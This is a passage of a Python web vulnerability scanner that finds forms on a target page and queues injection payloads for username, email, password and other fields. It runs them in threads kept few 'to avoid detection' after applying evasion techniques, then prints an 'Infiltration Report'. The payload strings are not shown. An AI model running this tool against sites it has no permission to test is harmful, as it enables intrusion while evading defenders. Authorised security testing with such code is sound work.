            r'<div', r'<span', r'<p>', r'<table', r'class=', r'style=',
            # Common JavaScript
            r'function', r'var ', r'const ', r'document\.', r'window\.',
            # Common form elements
            r'input', r'button', r'submit', r'form',
            # Common message fragments
            r'error', r'warning', r'notice', r'alert'
        ]
        
        return any(re.search(pattern, text.lower()) for pattern in common_patterns)

    def run(self):
        """Scan ONLY the forms found on the specific target URL"""
        print(HackerStyle.header("Initiating Scan of Target URL ONLY"))
        
        # Apply evasion techniques
        self.apply_evasion_techniques()
        
        # If no forms detected, inform the user
        if not self.detected_forms:
            print(HackerStyle.error("No injectable forms detected on the target page"))
            return
        
        # Process each form found on the target page
        for form_url, form_info in self.detected_forms.items():
            print(HackerStyle.header(f"Scanning {form_info['type']} form at {form_url}"))
            
            # Get the page and parse forms
            try:
                response = self.session.get(form_url, cookies=self.cookies, timeout=15)
                soup = BeautifulSoup(response.text, 'html.parser')
                forms = soup.find_all('form')
                
                if not forms:
                    print(HackerStyle.warning(f"No forms found at {form_url}"))
                    continue
                    
                # Process each form on the page
                for form in forms:
                    form_details = self.get_form_details(form)
                    
                    # Only test forms that match our detected form URL
                    if form_details['action'] != form_url:
                        continue
                    
                    # Create queue items for each input in the form
                    for input_field in form_details["inputs"]:
                        # Skip inputs without names (they can't be submitted)
                        if not input_field["name"]:
                            continue
                            
                        # Skip submit buttons, images, files, etc.
                        if input_field["type"] in ["submit", "button", "image", "file", "reset"]:
                            continue
                            
                        # Generate payloads for this input
                        input_purpose = "generic"
                        for detected_input in form_info["inputs"]:
                            if detected_input["name"] == input_field["name"]:
                                input_purpose = detected_input["purpose"]
                                break
                        
                        # Generate targeted payloads based on input purpose
                        payloads = []
                        if input_purpose == "username":
                            payloads = self.payloads.get("username", [])[:5]
                        elif input_purpose == "email":
                            payloads = self.payloads.get("email", [])[:5]
                        elif input_purpose == "password":
                            payloads = self.payloads.get("password", [])[:5]
                        else:
                            payloads = self.payloads.get("general", [])[:5]
                        
                        # Add to queue
                        for payload in payloads:
                            self.queue.put((form_details, input_field, payload, form_info["type"]))
                    
                    print(HackerStyle.info(f"Queued payloads for form at {form_details['action']}"))
            except Exception as e:
                print(HackerStyle.error(f"Error processing form at {form_url}: {e}"))
        
        # If no payloads were queued, end here
        if self.queue.empty():
            print(HackerStyle.error("No valid inputs found for testing"))
            return
        
        # Determine appropriate thread count based on queue size (less threads to avoid detection)
        thread_count = min(5, self.queue.qsize())
        print(HackerStyle.header(f"Launching {thread_count} scanning threads"))
        
        # Create and start worker threads
        threads = []
        for _ in range(thread_count):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Show progress while waiting for queue to empty
        total_tests = self.queue.qsize()
        while not self.queue.empty():
            remaining = self.queue.qsize()
            completed = total_tests - remaining
            percent = completed / total_tests * 100 if total_tests > 0 else 0
            
            # Clear previous line and print progress
            sys.stdout.write(f"\r{HackerStyle.NEON_GREEN}Progress: [{completed}/{total_tests}] {percent:.1f}%{HackerStyle.RESET}")
            sys.stdout.flush()
            time.sleep(0.5)
        
        print("\n" + HackerStyle.success("All tests queued, waiting for completion..."))
        
        # Wait for all threads to complete
        for t in threads:
            t.join()
        
        # Final report with refined styling
        print("\n" + "=" * 50)
        print(HackerStyle.header("Infiltration Report"))
        
        if self.results:
            print(HackerStyle.success(f"{len(self.results)} Vulnerabilities Discovered:"))
            for payload, action, form_type in self.results:
                print(f"  {HackerStyle.highlight('Form Type:')} {form_type}")
                print(f"  {HackerStyle.highlight('Payload:')} {payload}")
                print(f"  {HackerStyle.highlight('Endpoint:')} {action}\n")
        else:
            print(HackerStyle.error("No Vulnerabilities Detected"))
    
        print("=" * 50)
    
        # Generate and print report location
        report_file = self.generate_report()
        print(f"\n{HackerStyle.success(f'Detailed Report Generated: {report_file}')}")

if __name__ == "__main__":
    if len(sys.argv) != 3 or sys.argv[1] != "scope":
        print(HackerStyle.error("Usage: python cyberscoper.py scope http://example.com"))
        sys.exit(1)

    target_url = sys.argv[2]
    scanner = CyberScoper(target_url)
    scanner.run()
